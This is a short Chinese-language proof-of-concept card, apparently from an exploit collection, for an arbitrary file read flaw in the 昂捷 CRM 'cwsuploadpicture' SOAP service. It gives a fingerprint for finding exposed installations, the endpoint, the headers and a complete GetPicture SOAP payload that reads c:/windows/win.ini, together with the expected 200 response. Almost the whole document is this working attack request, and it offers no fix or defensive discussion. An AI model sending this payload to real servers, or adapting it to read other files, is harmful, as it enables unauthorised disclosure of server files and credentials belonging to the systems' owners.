# 昂捷CRMCwsuploadpicture任意文件读取漏洞

- **系统**：昂捷CRMCwsuploadpicture　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`"HisModules/ErpAdmin/RoleMng/Js/selectDefaultRole.js"`
- **请求**：`POST /enjoyRMIS_WS/WS/Common/cwsuploadpicture.asmx HTTP/1.1`
- **关键头**：`Content-Type: text/xml; charset=utf-8`　`Content-Length: 380`　`SOAPAction: "http://tempuri.org/GetPicture"`

**请求体 / payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetPicture xmlns="http://tempuri.org/">
<sFullFileName>c:/windows/win.ini</sFullFileName>
</GetPicture>
</soap:Body>
</soap:Envelope>
```
- **预期**：200　|　—